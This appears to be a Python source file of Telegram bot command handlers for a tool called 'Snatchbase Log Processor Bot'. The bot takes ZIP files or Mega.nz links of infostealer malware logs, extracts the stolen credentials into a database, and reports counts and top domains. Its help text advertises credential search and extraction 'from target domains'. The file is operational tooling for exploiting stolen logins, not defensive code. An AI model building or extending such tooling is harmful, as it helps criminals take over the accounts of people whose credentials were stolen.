"""
Command handlers for Telegram bot
"""
from telegram import Update
from telegram.ext import ContextTypes
from sqlalchemy import func
from app.database import SessionLocal
from app.models import Credential, Device, Upload
from .config import logger, ALLOWED_USER_ID, UPLOAD_DIR
from .utils import get_back_button


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with comprehensive statistics"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        logger.warning(f"Unauthorized access attempt from user {user_id}")
        return
    
    # Get database statistics
    db = SessionLocal()
    try:
        # Get total counts
        total_credentials = db.query(func.count(Credential.id)).scalar() or 0
        total_systems = db.query(func.count(Device.device_id)).scalar() or 0
        total_uploads = db.query(func.count(Upload.upload_id)).scalar() or 0
        
        # Get unique domains count
        unique_domains = db.query(func.count(func.distinct(Credential.domain))).scalar() or 0
        
        # Count pending ZIP files
        zip_files = list(UPLOAD_DIR.glob("*.zip"))
        
        # Build comprehensive message
        message = (
            "🤖 *Snatchbase Log Processor Bot*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            
            "📊 *DATABASE STATISTICS*\n"
            f"🔑 Total Credentials: {total_credentials:,}\n"
            f"🖥️ Total Systems: {total_systems:,}\n"
            f"📦 Total Uploads: {total_uploads:,}\n"
            f"🌐 Unique Domains: {unique_domains:,}\n"
            f"📁 Pending Files: {len(zip_files)}\n\n"
            
            "⚙️ *COMMANDS*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "/start - Show statistics\n"
            "/status - Check bot status\n"
            "/stats - Database analytics\n"
            "/recent - Recent activity (24h/7d/30d)\n"
            "/search - Search credentials\n"
            "/topdomains - View top domains\n"
            "/extractdomains - Extract credentials from target domains\n\n"
            
            "📤 *SEND FILES*\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "Send me ZIP files or Mega.nz links with logs:\n"
            "✅ Upload ZIP files directly\n"
            "✅ Paste Mega.nz download links\n"
            "✅ Auto-process and extract credentials\n"
            "✅ Auto-delete ZIP files after processing\n"
        )
        
        await update.message.reply_text(message, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Error getting statistics: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "🤖 *Snatchbase Log Processor Bot*\n\n"
            "Send me ZIP files containing stealer logs and I'll:\n"
            "✅ Save them to the upload directory\n"
            "✅ Process and extract credentials\n"
            "✅ Delete the ZIP files after processing\n\n"
            "Commands:\n"
            "/start - Show this message\n"
            "/status - Check bot status",
            parse_mode='Markdown'
        )
    finally:
        db.close()


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        return
    
    # Count files in upload directory
    zip_files = list(UPLOAD_DIR.glob("*.zip"))
    
    await update.message.reply_text(
        f"✅ *Bot Status*\n\n"
        f"📁 Upload Directory: `{UPLOAD_DIR}`\n"
        f"📦 ZIP Files Pending: {len(zip_files)}\n"
        f"🤖 Status: Active",
        parse_mode='Markdown',
        reply_markup=get_back_button()
    )


async def top100_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /top100 and /topdomains command to show top 100 domains"""
    user_id = update.effective_user.id
    
    if user_id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Unauthorized access denied.")
        return
    
    db = SessionLocal()
    try:
        # Get top 100 domains
        top_domains = db.query(
            Credential.domain,
            func.count(Credential.id).label('count')
        ).group_by(
            Credential.domain
        ).order_by(
            func.count(Credential.id).desc()
        ).limit(100).all()
        
        if not top_domains:
            await update.message.reply_text("No domains found in database.")
            return
        
        # Split into multiple messages (Telegram has message length limit)
        message_parts = []
        current_message = "📊 *TOP 100 DOMAINS*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        for i, (domain, count) in enumerate(top_domains, 1):
            line = f"{i}. {domain} - {count:,}\n"
            
            # If message gets too long, start a new one
            if len(current_message + line) > 4000:
                message_parts.append(current_message)
                current_message = f"*TOP 100 DOMAINS (continued)*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{line}"
            else:
                current_message += line
        
        # Add the last part
        if current_message:
            message_parts.append(current_message)
        
        # Send all message parts
        for i, part in enumerate(message_parts):
            # Add back button only to the last message
            if i == len(message_parts) - 1:
                await update.message.reply_text(part, parse_mode='Markdown', reply_markup=get_back_button())
            else:
                await update.message.reply_text(part, parse_mode='Markdown')
            
    except Exception as e:
        logger.error(f"Error getting top domains: {str(e)}", exc_info=True)
        await update.message.reply_text(f"❌ Error retrieving top domains: {str(e)}", reply_markup=get_back_button())
    finally:
        db.close()
